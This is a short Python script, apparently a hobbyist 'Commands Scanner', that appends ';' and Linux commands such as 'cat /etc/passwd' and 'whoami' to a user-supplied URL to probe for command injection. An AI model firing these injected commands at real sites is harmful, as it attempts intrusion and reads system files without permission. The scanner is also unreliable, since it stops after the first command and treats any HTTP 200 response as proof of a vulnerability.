import requests
import sys
import time

print('''\033[92m
  ____                                          _             
 / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |___         
| |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` / __|        
| |__| (_) | | | | | | | | | | | (_| | | | | (_| \__ \        
 \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|___/        
   ___
  / __| __ __ _ _ _  _ _  ___ _ _
  \__ \/ _/ _` | ' \| ' \/ -_) '_|
  |___/\__\__,_|_||_|_||_\___|_|                                           
''')

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(10. / 100)


try:
    
    def scan(url):
        # These are common Linux commands
        commands = ["ls", "cat /etc/passwd", "uname -a", "whoami", "netstat -an", "ps -ef", "ifconfig", "date", "id", "last", "w"]

        for command in commands:
            # We use a semicolon to separate our command from the original one
            r = requests.get(url + ';' + command)
            if r.status_code == 200:
                slowprint(f"\033[91m [+] Command Injection Vulnerability Found In {url}")
            else:
                slowprint("\033[94m [-] Vulnerability Not Found")
            break
        
# Test the scanner with a vulnerable URL
    scan(input("\033[92m [*] Enter URL: "))

except KeyboardInterrupt:
    slowprint("\n [-] Ctrl + C Detected...")
    
input("\n\033[93m Enter To Exit")